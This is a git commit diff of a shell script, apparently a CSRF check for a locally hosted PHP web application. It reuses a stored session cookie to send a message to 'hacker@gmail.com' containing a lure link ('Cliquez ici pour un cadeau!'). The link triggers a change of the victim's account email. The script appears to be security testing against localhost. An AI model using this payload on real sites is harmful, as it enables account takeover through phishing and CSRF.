990d29e52309484b8bdf19b3dd31968ca53abb4f
yoannconstans <145764040+yoannconstans@users.noreply.github.com>
2025-01-24 13:08:52 +0100

    Update check_CSRF.sh

--- check_CSRF.sh
+++ check_CSRF.sh
@@ -1,47 +1,34 @@
+
+#DATA="send_email=1&receiver_emails=hacker@gmail.com&title=WWHEATETGSAGSHDFIGASHRGAIWRHGAWRIGH&content=<a href='/pages/user/mail.php?id=3&new_email=hacker2@gmail.com&change_email=1'>Cliquez ici pour un cadeau!</a>"
+
 #!/bin/bash
 
-source ./check_login.sh
+# Read session information from session_info.txt
+PHPSESSID=$(head -n 1 session_info.txt)
+USER_ID=$(tail -n 1 session_info.txt)
 
-check_login
-
-# Vérifier si le fichier de cookies a été généré
-if [ ! -f $COOKIE_FILE ]; then
-    echo "Erreur : le fichier de cookies n'a pas été généré. Impossible de continuer."
+# Ensure variables are not empty
+if [ -z "$PHPSESSID" ] || [ -z "$USER_ID" ]; then
+    echo "Failed to retrieve session information."
     exit 1
 fi
 
-# URL de la page qui gère l'envoi de mails
-URL="http://127.0.0.1/controller/api/user/mail.php"
+# Construct the URL for the user email page
+MAIL_PAGE_URL="http://127.0.0.1/pages/user/send_email.php?id=$USER_ID"
 
-# Données malveillantes
-DATA="receiver_emails=hacker@gmail.com&title=Test&content=<a href='https://www/functions/user/mail.php?id=3&new_email=hacker2@gmail.com'>Cliquez ici pour un cadeau!</a>&send_email=1"
+# Use PHPSESSID and form data to send a POST request
+response=$(curl -i -L -X POST "$MAIL_PAGE_URL" \
+    -b "PHPSESSID=$PHPSESSID" \
+    -d "receiver_emails=hacker@gmail.com" \
+    -d "title=WWHEATETGSAGSHDFIGASHRGAIWRHGAWRIGH" \
+    -d "content=<a href='/pages/user/mail.php?id=3&new_email=hacker2@gmail.com&change_email=1'>Cliquez ici pour un cadeau!</a>" \
+    -d "send_email=""")
 
-# Points initiaux
-# points=2000
-
-response=$(curl -s -L -i -X POST "$MAIL_URL" \
-    -d "$DATA" \
-    -b $COOKIE_FILE)
-
-# Afficher la réponse complète pour le débogage (optionnel)
+# Check HTTP status code and if there are new emails
 echo "----------------------------------------"
-echo "Réponse complète :"
-echo "$response"
-echo "----------------------------------------"
-
 if echo "$response" | grep -q "200 OK"; then
-    echo "HTTP Success"
-
-    if echo "$response" | grep -q "Invalid email"; then
-        echo "L'e-mail a été détecté comme invalide (OK)."
-    elif echo "$response" | grep -q "Email sent"; then
-        echo "Attention : L'e-mail a été envoyé !"
-    else
-        echo "Le comportement du site est indéterminé."
-    fi
-
+    echo "Sending email succeeded"
 else
-    echo "Requête échouée. Vérifiez l'URL ou les paramètres."
+    echo "Failed to send the email ."
 fi
-
 echo "----------------------------------------"
